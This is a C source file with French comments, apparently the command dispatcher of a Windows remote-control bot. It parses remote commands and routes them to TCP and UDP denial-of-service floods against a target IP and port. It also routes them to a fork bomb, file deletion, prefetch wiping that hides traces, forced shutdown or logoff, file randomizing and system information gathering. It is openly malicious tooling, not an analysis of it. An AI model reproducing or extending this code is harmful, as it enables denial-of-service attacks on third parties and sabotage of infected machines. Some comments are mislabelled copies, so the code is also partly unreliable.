#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "proto.h"

const char *ftexec(char *command) {

    char *token = strtok(command, " "); // Divise la chaîne en mots
    int len = strlen(command);
    if (len > 0 && (command[len - 1] == '\n' || command[len - 1] == '\r')) 
    {
        command[len - 1] = '\0';  // Supprimer le caractère de fin de ligne
    }

    if (token != NULL) {
        if (strcmp(token, "ddostcp") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre port
            if (token != NULL) {
                int port = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot de la string qui est notre addresse ip
                if (token != NULL) {
                    char * addrip = token;
                    
                    token = strtok(NULL, " "); // Obtient le quatrième mot de la string qui est notre nombre de paquets
                    if (token != NULL) {
                        int nbpackets = atoi(token);

                        token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                        if (token != NULL) {
                            int sizepacket = atoi(token);

                            token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                            if (token != NULL) {
                                int delai = atoi(token);
                                ddostcp(port, addrip, nbpackets, sizepacket, delai );
                                return ("DDOS TCP fini...\n"); 
                            }
                        }
                    } 
                } 
            } 
        }


        else if (strcmp(token, "ddosudp") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre port
            if (token != NULL) {
                int port = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot de la string qui est notre addresse ip
                if (token != NULL) {
                    char * addrip = token;
                    
                    token = strtok(NULL, " "); // Obtient le quatrième mot de la string qui est notre nombre de paquets
                    if (token != NULL) {
                        int nbpackets = atoi(token);

                        token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                        if (token != NULL) {
                            int sizepacket = atoi(token);

                            token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                            if (token != NULL) {
                                int delai = atoi(token);
                                ddosudp(port, addrip, nbpackets, sizepacket, delai );
                                return ("DDOS UDP fini...\n"); 
                            }
                        }
                    } 
                } 
            } 
        }


        else if (strcmp(token, "delfile") == 0) {

            token = strtok(NULL, " "); 
            if (token != NULL) {
                char * fichierdel = token;
                const char *result = supfichier(fichierdel);
                return result; 

            } 
        }


        else if (strcmp(token, "forkbomb") == 0) {
            forkbomb();
            return ("Bombe fork fini...\n"); 
        }

        else if (strcmp(token, "test") == 0) {
            Sleep(3000);
            const char *result = testfunction();
            return result;
        }


        else if (strcmp(token, "delprefetch") == 0) {
            const char *result = deletePrefetchFiles();
            return result; 
        }
 

        else if (strcmp(token, "image") == 0) {

            token = strtok(NULL, " "); 
            if (token != NULL) {
                char * fichierimage = token;
                const char *result = image(token);
                return result; 

            } 
        }

        else if (strcmp(token, "lock") == 0) {
                printf("Demarrage de la fonction lock \n");
                const char *result = lock(token);
                return result; 
        }


        else if (strcmp(token, "logoff") == 0) {

                const char *result = logoff(token);
                return result;                
        }

        else if (strcmp(token, "shutdownfunc") == 0) {
                const char *result = shutdownfunc(token);
                return result; 
            
        }

        else if (strcmp(token, "restart") == 0) {
                const char *result = restart(token);
                return result;                
            
        }


        else if (strcmp(token, "song") == 0) {

            token = strtok(NULL, " "); 
             if (token != NULL) {
                char * filename = token;  
                const char *result = song(token);
                return result;
            } 
        }


        else if (strcmp(token, "randomize") == 0) {

            token = strtok(NULL, " "); 
             if (token != NULL) {
                char *directoryPath = token;
                const char *result = randomize(directoryPath);
                return result;
            } 
        }



        else if (strcmp(token, "sysinfo") == 0) {
            
             const char *result = GetSysInf(token);
             return result;
            }


        else if (strcmp(token, "sysinfoall") == 0) {
            
             const char *result = sysinfoall(token);
             return result;
            }


        else if (strcmp(token, "enum") == 0) {

            token = strtok(NULL, " "); 
             if (token != NULL) {
                const char * filename = token;
                const char *result = enumfile(token);
                return result;
            } 
        }



        else if (strcmp(token, "msgbox") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre port
            if (token != NULL) {
                char * titre = token;

                token = strtok(NULL, " "); // Obtient le troisième mot de la string qui est notre addresse ip
                if (token != NULL) {
                    char * texte = token;
                    
                    token = strtok(NULL, " "); // Obtient le quatrième mot de la string qui est notre nombre de paquets
                    if (token != NULL) {
                        int numeroType = atoi(token);
                        const char *result = afficherMessageBox(titre, texte, numeroType);
                        return result;

                    } 
                } 
            } 
        }
    return "Aucune fonction #";
    }
}

// A faire en se basant sur le nombre de fonction et le nombre d'arguments